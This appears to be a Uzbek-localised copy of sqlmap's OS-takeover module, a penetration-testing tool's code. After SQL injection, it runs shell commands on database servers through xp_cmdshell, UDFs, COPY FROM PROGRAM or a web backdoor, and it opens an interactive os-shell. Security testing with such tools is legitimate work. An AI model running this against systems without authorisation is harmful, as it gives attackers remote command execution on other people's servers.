#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

from lib.core.uzbek import ut
import sys

from lib.core.common import Backend
from lib.core.common import dataToStdout
from lib.core.common import getSQLSnippet
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import AUTOCOMPLETE_TYPE
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.request import inject
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import XP_cmdshell
from lib.utils.safe2bin import safechardecode
from thirdparty.six.moves import input as _input

class Abstraction(Web, UDF, XP_cmdshell):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / XP_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        XP_cmdshell.__init__(self)

    def execCmd(self, cmd, silent=False):
        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            self.webBackdoorRunCmd(cmd)

        elif Backend.isDbms(DBMS.PGSQL) and self.checkPlExec():
            self.plExecCmd(cmd, silent=silent)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            self.udfExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.MSSQL):
            self.xpCmdshellExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.H2):
            self.h2ExecCmd(cmd, silent=silent)

        else:
            errMsg = 'Bu funksiya serverdagi DBMS uchun hali yaratilmagan'
            raise SqlmapUnsupportedFeatureException(errMsg)

    def evalCmd(self, cmd, first=None, last=None):
        retVal = None

        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            retVal = self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            retVal = self.webBackdoorRunCmd(cmd)

        elif Backend.isDbms(DBMS.PGSQL) and self.checkPlExec():
            retVal = self.plExecCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            retVal = self.udfEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.MSSQL):
            retVal = self.xpCmdshellEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.H2):
            retVal = self.h2EvalCmd(cmd, first, last)

        else:
            errMsg = 'Bu funksiya serverdagi DBMS uchun hali yaratilmagan'
            raise SqlmapUnsupportedFeatureException(errMsg)

        return safechardecode(retVal)

    def runCmd(self, cmd):
        choice = None

        if not self.alwaysRetrieveCmdOutput:
            message = ut('do you want to retrieve the command standard ', 'buyruqning standart ')
            message += ut('output? [Y/n/a] ', 'chiqishini olishni xohlaysizmi? [Y/n/a] ')
            choice = readInput(message, default='Y').upper()

            if choice == 'A':
                self.alwaysRetrieveCmdOutput = True

        if choice == 'Y' or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string('buyruqning standart chiqishi', output)
            else:
                dataToStdout("Chiqish yo'q\n")
        else:
            self.execCmd(cmd)

    def shell(self):
        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            infoMsg = "OT buyruq qobig'i ochilmoqda. Chiqish uchun "
            infoMsg += "'x' yoki 'q' yozib, ENTER bosing"
            logger.info(infoMsg)

        else:
            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                infoMsg = "'COPY ... FROM PROGRAM ...' ishlatiladi: "
                infoMsg += 'buyruq bajarish'
                logger.info(infoMsg)

            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                infoMsg = 'kiritilgan foydalanuvchi funksiyalari ishlatiladi: '
                infoMsg += "'sys_eval' va 'sys_exec'; vazifa: operatsion tizimda "
                infoMsg += 'buyruq bajarish'
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "'xp_cmdshell' kengaytirilgan protsedurasi ishlatiladi: "
                infoMsg += 'operatsion tizim buyruqlarini bajarish'
                logger.info(infoMsg)

            else:
                errMsg = 'bu funksiya serverdagi DBMS uchun hali yaratilmagan'
                raise SqlmapUnsupportedFeatureException(errMsg)

            infoMsg = "%s OT buyruq qobig'i ochilmoqda. Chiqish uchun " % (Backend.getOs() or "Windows")
            infoMsg += "'x' yoki 'q' yozib, ENTER bosing"
            logger.info(infoMsg)

        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)

        while True:
            command = None

            try:
                command = _input("os-shell> ")
                command = getUnicode(command, encoding=sys.stdin.encoding)
            except UnicodeDecodeError:
                pass
            except KeyboardInterrupt:
                print()
                errMsg = "foydalanuvchi to'xtatdi"
                logger.error(errMsg)
            except EOFError:
                print()
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ("x", "q", "exit", "quit"):
                break

            self.runCmd(command)

    def _initRunAs(self):
        if not conf.dbmsCred:
            return

        if not conf.direct and not isStackingAvailable():
            errMsg = "stacked queries qo'llanmaydi, shuning uchun sqlmap "
            errMsg += 'buyruqlarni boshqa foydalanuvchi nomidan bajara olmaydi. Bajarish '
            errMsg += "davom etadi va berilgan DBMS kirish ma'lumotlari "
            errMsg += "e'tiborga olinmaydi"
            logger.error(errMsg)

            return

        if Backend.isDbms(DBMS.MSSQL):
            msg = ut('on Microsoft SQL Server 2005 and 2008, OPENROWSET function ', 'Microsoft SQL Server 2005 va 2008 da OPENROWSET ')
            msg += ut('is disabled by default. This function is needed to execute ', "odatda o'chirilgan. Bu funksiya buyruqlarni boshqa ")
            msg += ut('statements as another DBMS user since you provided the ', 'DBMS foydalanuvchisi nomidan bajarish uchun kerak, chunki ')
            msg += ut("option '--dbms-creds'. If you are DBA, you can enable it. ", "'--dbms-creds' berilgan. DBA bo'lsangiz, uni yoqa olasiz. ")
            msg += ut('Do you want to enable it? [Y/n] ', 'Uni yoqasizmi? [Y/n] ')

            if readInput(msg, default='Y', boolean=True):
                expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                inject.goStacked(expression)

        # TODO: add support for PostgreSQL
        # elif Backend.isDbms(DBMS.PGSQL):
        #     expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
        #     inject.goStacked(expression)

    def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):
        self._initRunAs()

        if self.envInitialized and not forceInit:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg = "so'ralgan funksiya ishlamasligi mumkin, chunki "
                warnMsg += 'joriy sessiya foydalanuvchisi baza administratori emas'

                if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    warnMsg += ". '--dbms-cred' parametrini sinab ko'rishingiz mumkin: "
                    warnMsg += 'buyruqlarni DBA nomidan bajarish uchun, agar '
                    warnMsg += 'DBA parolini olish va aniqlashga '
                    warnMsg += "muvaffaq bo'lgan bo'lsangiz"

                logger.warning(warnMsg)

            if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and (self.checkCopyExec() or self.checkPlExec()):
                success = True
            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                success = self.udfInjectSys()

                if success is not True:
                    msg = ut('unable to mount the operating system takeover', "operatsion tizimni boshqarishni yo'lga qo'yib bo'lmadi")
                    raise SqlmapFilePathException(msg)
            elif Backend.isDbms(DBMS.MSSQL):
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = 'bu funksiya serverdagi DBMS uchun hali yaratilmagan'
                raise SqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
